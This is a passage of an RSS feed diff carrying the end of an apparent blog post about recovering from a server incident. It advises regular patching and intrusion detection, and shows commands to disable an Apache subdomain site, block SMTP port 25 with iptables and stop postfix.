+&lt;/h3>&lt;h3 id="white_check_mark-solution-white_check_mark--patch-systems-regularly-and-keep-an-eye-out-for-vulnerabilities-we-can-install-host-based-andor-network-based-intrusion-detection-systems-for-good-measure">&amp;#x2705; SOLUTION &amp;#x2705; : Patch systems regularly and keep an eye out for vulnerabilities. We can install Host-based and/or Network-based Intrusion Detection Systems for good measure.
+&lt;/h3>&lt;h3 id="cleaning-up">Cleaning Up
+&lt;/h3>&lt;p>Since we were not using the subdomain site, I simply shut it down:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="gp">$&lt;/span>vim /etc/apache2/sites-available/default-ssl.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span>&lt;span class="go"> #&amp;lt;VirtualHost _default_:443&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go"> # ServerAdmin admin@email.ca
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go"> # ServerName subdomain.website.ca
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go"> # # Indexes + Directory Root.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go"> # DirectoryIndex index.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go"> # DocumentRoot /var/www/subdomain/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go"> # …
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span>&lt;span class="gp">$&lt;/span>sudo service apache2 restart
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>For safety purposes, I also blocked SMTP Port and stopped the mail service:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">sudo iptables -A INPUT -i eth0 -p tcp --destination-port 25 -j DROP
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">sudo /etc/init.d/postfix stop
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
